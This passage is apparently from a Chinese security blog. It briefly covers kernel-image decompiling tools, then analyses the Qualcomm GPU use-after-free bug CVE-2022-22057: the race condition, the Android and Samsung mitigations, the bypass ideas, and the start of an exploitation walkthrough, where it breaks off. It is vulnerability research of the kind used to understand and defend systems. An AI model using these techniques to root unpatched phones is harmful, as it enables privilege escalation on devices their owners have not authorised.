<p>进入<code>droidimg</code>目录并自行编译<code>fix_kaslr_arm64.c</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;fix_kaslr_arm64&gt; &lt;patch to origin image&gt; &lt;path to patched image&gt;</span><br></pre></td></tr></table></figure>

<h2 id="反编译Image"><a href="#反编译Image" class="headerlink" title="反编译Image"></a>反编译Image</h2><h3 id="安装droidimg到ida"><a href="#安装droidimg到ida" class="headerlink" title="安装droidimg到ida"></a>安装droidimg到ida</h3><p>将<code>droidimg</code>目录下的<code>vmlinux.py</code>复制进<code>IDA Pro</code>安装目录下的<code>loaders</code>里, 注意你可能需要解决相应的<code>python</code>依赖。</p>
<h3 id="打开Image"><a href="#打开Image" class="headerlink" title="打开Image"></a>打开Image</h3><p>最后用<code>IDA Pro</code>打开我们最终的Image, 文件类型选择<code>Android/Linux Kernel Image(ARM)</code>即可。</p>
<h2 id="vmlinux-to-elf-强烈推荐🌟"><a href="#vmlinux-to-elf-强烈推荐🌟" class="headerlink" title="vmlinux-to-elf(强烈推荐🌟)"></a>vmlinux-to-elf(强烈推荐🌟)</h2><p>这个工具好使<a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf%EF%BC%8C%E8%83%BD%E8%A7%A3%E6%9E%90%E5%87%BA%60boot.img%60%E4%B8%AD%E4%B8%8D%E5%B0%91%E4%B8%9C%E8%A5%BF%E3%80%82">https://github.com/marin-m/vmlinux-to-elf，能解析出`boot.img`中不少东西。</a></p>
<p>生成一个 <code>.ELF</code> 文件，您可以使用 IDA Pro 和 Ghidra 进行分析。</p>
<p>功能：</p>
<ul>
<li>将原始文件 <code>[OK blob]</code> 或 ELF 内核作为输入</li>
<li>自动检测和解包 <code>Linux</code> 内核使用的主要压缩格式 [OK]</li>
<li>输入文件中并查找嵌入内核符号表(kalls) [OK]</li>
<li>其他指令集架构、字节序位大小、依赖于的通用函数签名 [OK]</li>
<li>从 <code>kallsyms </code>中包含的符号接线器内核的表点 [OK]</li>
<li>内核为内核，提供基本解释，它考虑低基地址（现在是第一个地址）</li>
<li>解压某种类型的 Android <code>boot.img</code>文件，以一种<code>ANDROID!</code>或<code>UNCOMPRESSED_IMG</code>魔术的形式呈现 [OK]</li>
<li>使用 IDA Pro 或 Ghidra 生成可完全分析的 .ELF 文件作为输出 [OK]</li>
</ul>
<p>安装直接<code>python setup.py install</code>即可。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/WX20220623-220539@2x.png" alt="WX20220623-220539@2x"></p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/WX20220623-220748@2x.png" alt="WX20220623-220748@2x"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-18T08:50:51.000Z" title="2022/6/18 16:50:51">2022-06-18</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-20T14:08:16.790Z" title="2022/6/20 22:08:16">2022-06-20</time></span><span class="level-item">2 hours read (About 13695 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/18/Qualcomm-GPU%E9%A9%B1%E5%8A%A8UAF%E6%BC%8F%E6%B4%9E-CVE-2022-22057/">Qualcomm GPU驱动UAF漏洞(CVE-2022-22057)</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又是一篇关于<code>Qualcomm</code>驱动程序的漏洞，然而上一篇关于驱动的漏洞还没去验证呢😮‍💨</p>
<p>今天这一篇是官员<code>Qualcomm GPU</code>的 UAF 漏洞，影响搭载了<code>Snapdragon 888</code>及以上芯片、内核版本为 5.4 及以上的设备，如S21、Galaxy Z Flip3等。</p>
<p>高通的安全公告：<a target="_blank" rel="noopener" href="https://docs.qualcomm.com/product/publicresources/securitybulletin/may-2022-bulletin.html">Qualcomm security bulletin in May 2022</a>。</p>
<h2 id="为什么要挖GPU驱动漏洞呢？"><a href="#为什么要挖GPU驱动漏洞呢？" class="headerlink" title="为什么要挖GPU驱动漏洞呢？"></a>为什么要挖GPU驱动漏洞呢？</h2><ol>
<li>GPU 驱动中有很多缓解措施；</li>
<li>2021年在野利用的 Android 0Day 漏洞有7个，其中5个是关于 GPU 驱动的；</li>
<li>GPU 驱动可以从未信任的应用沙箱中进行访问；</li>
<li>大多数的 GPU 驱动都会处理 GPU 和 CPU 之间的复杂的内存共享逻辑，处理精心制作的恶意代码将导致任意内存读写。由于攻击者滥用GPU 内存管理代码，将导致内存损坏难以检测，以及对现有的缓解措施免疫；<ol>
<li>这里有两个滥用 GPU opcode 的例子：<a target="_blank" rel="noopener" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf">Guang Gong</a> 和 <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html">Ben Hawkes</a>。</li>
</ol>
</li>
</ol>
<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>漏洞是在Qualcomm <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/tree/msm-5.4.r2">msm 5.4 kernel</a> 中引入的，增加了<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c">kgsl timeline</a>特性和一些<code>ioctl</code>。<code>msm 5.4</code> 内核对内核图形支持层（kgsl）驱动程序（位于<code>drivers/gpu/msm</code>下）进行了一些相当重要的重构，并引入了一些新功能。就是这些新功能和重构，导致了新的安全问题。其中大部分是在内部发现并修复的，然后在公告中作为安全问题公开披露。</p>
<p> <code>kgsl_timeline</code> 对象可以通过<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L323"><code>IOCTL_KGSL_TIMELINE_CREATE</code></a> 和 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L96"><code>IOCTL_KGSL_TIMELINE_DESTROY</code></a>进行创建和销毁。 <code>kgsl_timeline</code>对象在其 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.h#L26"><code>fences</code></a>字段中存储了一个 <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/v5.9/driver-api/dma-buf.html"><code>dma_fence</code></a> 对象链表。使用<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L427"><code>IOCTL_KGSL_TIMELINE_FENCE_GET</code></a> 和 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L358"><code>IOCTL_KGSL_TIMELINE_WAIT</code></a>向链表中添加<code>dma_fence</code>对象。添加的<code>dma_fence</code>对象是<code>refcounted</code>对象，<code>dma_fence_put</code>方法用于减少它们的<code>refcount</code>。</p>
<p>有趣的是， <code>timeline-&gt;fences</code> 并没有真的持有一个<code>fences</code>的<code>refcount</code>。反之，为了避免 <code>timeline-&gt;fences</code> 中的 <code>dma_fence</code> 被释放，使用了一个自定义的 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L231"><code>release</code></a> 函数： <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> ，在<code>dma_fence</code>被释放之前， <code>timeline_fence_release</code> 从 <code>timeline-&gt;fences</code> 中移除该<code>dma_fence</code>。</p>
<p>当存储在 <code>kgsl_timeline::fences</code> 中的 <code>dma_fence</code> 的<code>refcount</code>减少为0时，方法 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> 被调用，以从 <code>kgsl_timeline::fences</code> 中移除 <code>dma_fence</code> ，然后调用 <code>dma_fence_free</code> 方法释放 <code>dma_fence</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timeline_fence_release</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irqsave(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the fence is still on the active list, remove it */</span></span><br><span class="line">    list_for_each_entry_safe(cur, temp, &amp;timeline-&gt;fences, node) &#123;</span><br><span class="line">        <span class="keyword">if</span> (f != cur)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        list_del_init(&amp;f-&gt;node);    <span class="comment">//&lt;----- 1. Remove fence</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irqrestore(&amp;timeline-&gt;fence_lock, flags);</span><br><span class="line">    ...</span><br><span class="line">    kgsl_timeline_put(f-&gt;timeline);</span><br><span class="line">    dma_fence_free(fence);     <span class="comment">//&lt;-------    2.  frees the fence</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>尽管移除操作被<code>timeline-&gt;fence_lock</code>所保护，<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L515"><code>IOCTL_KGSL_TIMELINE_DESTROY</code></a>仍然可以在 <code>dma_fence</code> 的<code>refcount</code>减少为0时，从 <code>fences</code> 中移除前，获取它的一个引用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock(&amp;timeline-&gt;fence_lock);  <span class="comment">//&lt;------------- a.</span></span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;timeline-&gt;fences, node)</span><br><span class="line">        dma_fence_get(&amp;fence-&gt;base);</span><br><span class="line">    list_replace_init(&amp;timeline-&gt;fences, &amp;temp);</span><br><span class="line">    spin_unlock(&amp;timeline-&gt;fence_lock);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123; <span class="comment">//&lt;----- b.</span></span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>kgsl_ioctl_timeline_destroy</code>中，销毁一个<code>timeline</code>之前，先将<code>timeline-&gt;fences</code>中的<code>fences</code>拷贝到<code>temp</code>中，然后从<code>timeline-&gt;fences</code>中删除（a）。由于<code>timeline-&gt;fences</code>没有保留额外的<code>fence</code>引用，<code>refcount</code>将被增加以阻止它们在<code>temp</code>中被释放。同样的，这里对 <code>timeline-&gt;fences</code> 的操作也受到<code>timeline-&gt;fence_lock</code>的保护。但是，当到达（a）时，<code>fence</code>的<code>refcount</code>已经为0了，方法 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> 还没有将其从 <code>kgsl_timeline::fences</code> 中移除时， <code>dma_fence</code> 将被移动到<code>temp</code>中，尽管此时它的引用增加了，但是也已经晚了，因为，随后方法 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> 将从 <code>kgsl_timeline::fences</code> 中移除它，无论<code>refcount</code>的值是多少。按照以下流程，UAF 将在（b）处触发。</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-1.webp" alt="Kernel-1"  />

<p>如上图所示，这是竞争的流程，通过在 <code>timeline-&gt;fence</code>中添加大量的 <code>dma_fence</code> ，可以增加<code>kgsl_ioctl_timeline_destroy</code>代码块运行的时间。如果在线程2中将 <code>timeline-&gt;fence</code>中最后一个 <code>dma_fence</code> 的<code>refcount</code>减少为0，同时保持线程1继续运行，我们可以在线程1的 <code>dma_fence_get</code> 将<code>refcount</code>加1前，调用 <code>timeline_fence_release</code> 。因为线程2也需要等待 <code>timeline-&gt;fence_lock</code>，它只有等线程1结束，才能从 <code>kgsl_timeline::fences</code> 中移除 <code>dma_fence</code> 。到那时， <code>timeline-&gt;fence</code>中所有的 <code>dma_fence</code> 都已经移动到<code>temp</code>中了。这就意味着，当线程2运行时， <code>timeline-&gt;fence</code>是一个空的链表，然后执行流程将很快到达 <code>dma_fence_free</code>。</p>
<p>简而言之，只要在 <code>timeline-&gt;fence</code>中放置足够的 <code>dma_fence</code> ，可以在<code>kgsl_ioctl_timeline_destroy</code>将 <code>timeline-&gt;fence</code>中 <code>dma_fence</code> 移动到<code>temp</code>的过程中，创造一个很大的竞争窗口，只要将 <code>timeline-&gt;fence</code>中最后一个 <code>dma_fence</code> 的<code>refcount</code>减少为0，就可以触发UAF。</p>
<h1 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h1><p>利用这个bug并不复杂，但是，有很多漏洞缓解措施，<a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/kcfi">kCFI</a> (Kernel Control Flow Integrity) 和 <a target="_blank" rel="noopener" href="https://android-developers.googleblog.com/2020/06/system-hardening-in-android-11.html">variable initialization</a> （这些在4.x内核中是关闭的，但是5.x内核全部开启了），还有 <a target="_blank" rel="noopener" href="https://www.samsungknox.com/en">Samsung RKP (Realtime Kernel Protection)</a> 。</p>
<h2 id="kCFI"><a href="#kCFI" class="headerlink" title="kCFI"></a>kCFI</h2><p><code>kCFI</code>可以说是最容易被绕过的缓解措施，特别是在与三星管理程序一起使用时，它保护了内核中许多重要的内存区域。<code>kCFI</code>通过限制动态调用点可以使用函数签名跳转到的位置来防止控制流被劫持。例如，在当前的漏洞中，<code>dma_fence</code>被释放后，函数<code>dma_fence_signal_locked</code>被调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);       <span class="comment">//&lt;---- free&#x27;d fence is used</span></span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dma_fence_signal_locked</code>将调用 <code>cur-&gt;func</code> ，该函数是<code>fence-&gt;cb_list</code>列表中的一个元素：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123;</span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果没有<code>kCFI</code>的话，已释放的 <code>fence</code> 将可以被<code>fake object</code>代替，意味着，包括<code>cb_list</code>和<code>func</code>，所有都是假的。只要绕过了<code>KASLR</code>，利用就十分简单了，如这个<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">利用</a>。但是由于<code>kCFI</code>，现在替换<code>func</code>的函数类型只能为 <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/include/linux/dma-fence.h#L118"><code>dma_fence_func_t</code></a>。</p>
<p>之前有关于如何绕过 Samsung 控制流完整性校验（JOPP, jump-oriented programming prevention）的<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">方法</a>，但是对<code>kCFI</code>没什么作用，绕过<code>kCFI</code>的常见方法是通过<code>double free</code>去劫持释放的链表，然后使用<a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf">Kernel Space Mirroring Attack (KSMA)</a>，但是，这种方法需要大量的时间，如[Three dark clouds over the Android kernel](<a target="_blank" rel="noopener" href="https://github.com/2freeman/Slides/blob/main/PoC-2020-Three">https://github.com/2freeman/Slides/blob/main/PoC-2020-Three</a> Dark clouds over the Android kernel.pdf) 和 <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Typhoon-Mangkhut-One-Click-Remote-Universal-Root-Formed-With-Two-Vulnerabilities.pdf">Typhoon Mangkhut: One-click remote universal root formed with two vulnerabilities</a> 。</p>
<p>这个bug也能提供<code>double free</code>，就是当 <code>dma_fence_put</code> 在 <code>fence</code> 被释放后调用时：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base); </span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);       <span class="comment">//&lt;----- free&#x27;d fence can be freed again</span></span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述做法减少了假 <code>fence</code> 对象的<code>refcount</code>，可以控制为1，这样假 <code>fence</code> 就会再次被释放。然而，这并不能应用<code>KSMA</code>，因为这需要覆盖<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/pgtable.h#L465"><code>swapper_pg_dir</code></a>数据结构，而这个结构是受三星管理程序保护的。</p>
<h2 id="Variable-initialization"><a href="#Variable-initialization" class="headerlink" title="Variable initialization"></a>Variable initialization</h2><p>从Android 11开始，内核可以通过启用各种内核构建标志来实现自动变量初始化。例如，以下是Z Flip3的构建配置：</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Memory initialization</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">CONFIG_CC_HAS_AUTO_VAR_INIT_PATTERN=y</span></span><br><span class="line"><span class="string">CONFIG_CC_HAS_AUTO_VAR_INIT_ZERO=y</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_STACK_NONE is not set</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_STACK_ALL_PATTERN is not set</span></span><br><span class="line"><span class="string">CONFIG_INIT_STACK_ALL_ZERO=y</span></span><br><span class="line"><span class="string">CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y</span></span><br><span class="line"><span class="comment"># CONFIG_INIT_ON_FREE_DEFAULT_ON is not set</span></span><br><span class="line"><span class="comment"># end of Memory initialization</span></span><br></pre></td></tr></table></figure>

<p>这个特征除了保护未初始化的变量以外，还使得替换对象变得困难。特别是，它不再可能执行部分对象替换，即只替换对象的第一个字节，而对象的其余部分仍然有效。如堆喷，<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Mitigations are attack surface, too</a>将不再可能。</p>
<p>这个特性将使得这个bug不能进行堆喷。</p>
<h2 id="kfree-rcu"><a href="#kfree-rcu" class="headerlink" title="kfree_rcu"></a>kfree_rcu</h2><p>这不是一个缓解措施，之所以提，是因为它有些类似已提出的 UAF 缓解措施的作用。这个bug中， <code>fence</code> 被 <code>dma_fence_free</code> 释放，不同于常规的 <code>kfree</code>，这里是使用 <code>kfree_rcu</code>。简单来说，<code>kfree_rcu</code>并不直接释放掉对象，只是在遇到某些情况时再进行释放。这有点像一个延迟释放，在对象被释放的时间上引入了一个不确定性（这和 <a target="_blank" rel="noopener" href="https://source.android.com/devices/tech/debug/scudo">Scudo</a>分配器的UAF缓解措施类似），这种不确定性对这个bug的利用还是很有阻碍（竞争窗口很紧张）的。</p>
<p>然而，有许多操纵竞争窗口大小的原语，比如<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/03/racing-against-clock-hitting-tiny.html">Racing against the clock—hitting a tiny kernel race window</a>和[Exploiting race conditions on (ancient) Linux](<a target="_blank" rel="noopener" href="https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019">https://static.sched.com/hosted_files/lsseu2019/04/LSSEU2019</a> - Exploiting race conditions on Linux.pdf)中的技术，（两者都是由Jann Horn编写的，较早的技术被用于利用当前的bug）任何紧张的竞争窗口都可以被做得足够大，以允许由<code>kfree_rcu</code>引起的延迟，以及随后的对象替换。</p>
<h2 id="Samsung-RKP-Realtime-Kernel-Protection"><a href="#Samsung-RKP-Realtime-Kernel-Protection" class="headerlink" title="Samsung RKP (Realtime Kernel Protection)"></a>Samsung RKP (Realtime Kernel Protection)</h2><p><code>RKP</code>保护内存不被写入，这可以防止进程覆盖自己的证书成为<code>root</code>，也可以保护<code>SELinux</code>设置不被覆盖。它还可以防止内核代码区和其他重要对象，如内核页表，被覆盖。不过在实践中，一旦实现了任意的内核内存读写（受<code>RKP</code>限制），就有办法绕过这些限制。例如，<code>SELinux</code>规则可以通过覆盖<code>avc</code>缓存来修改（例如，见Valentina Palmiotti的这个<a target="_blank" rel="noopener" href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c">利用</a>），而获得<code>root</code>可以通过<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">hijacking other processes that run as root</a>实现。</p>
<p>在这个bug中，<code>RKP</code>与<code>kCFI</code>合作，防止任意函数调用。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Adding-dma-fence-to-timeline-fences"><a href="#Adding-dma-fence-to-timeline-fences" class="headerlink" title="Adding dma_fence to timeline-&gt;fences"></a>Adding <code>dma_fence</code> to <code>timeline-&gt;fences</code></h2><p>有两个选项可以将<code>dma_fence</code>对象添加到<code>kgsl_timeline</code>中，第一个是使用<code>IOCTL_KGSL_TIMELINE_FENCE_GET</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_fence_get</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    timeline = kgsl_timeline_by_id(device, param-&gt;timeline);</span><br><span class="line">    ...</span><br><span class="line">    fence = kgsl_timeline_fence_alloc(timeline, param-&gt;seqno); <span class="comment">//&lt;----- dma_fence created and added to timeline</span></span><br><span class="line">    ...</span><br><span class="line">    sync_file = sync_file_create(fence);</span><br><span class="line">    <span class="keyword">if</span> (sync_file) &#123;</span><br><span class="line">        fd_install(fd, sync_file-&gt;file);</span><br><span class="line">        param-&gt;handle = fd;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>kgsl_timeline_fence_alloc</code>创建一个<code>dma_fence</code>，并将其添加到<code>timeline</code>上。然后调用者得到一个与<code>dma_fence</code>对应的<code>sync_file</code>的文件描述符。当<code>sync_file</code>被关闭时，<code>dma_fence</code>的<code>refcount</code>被减少到0。</p>
<p>第二个是 <code>IOCTL_KGSL_TIMELINE_WAIT</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_wait</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span 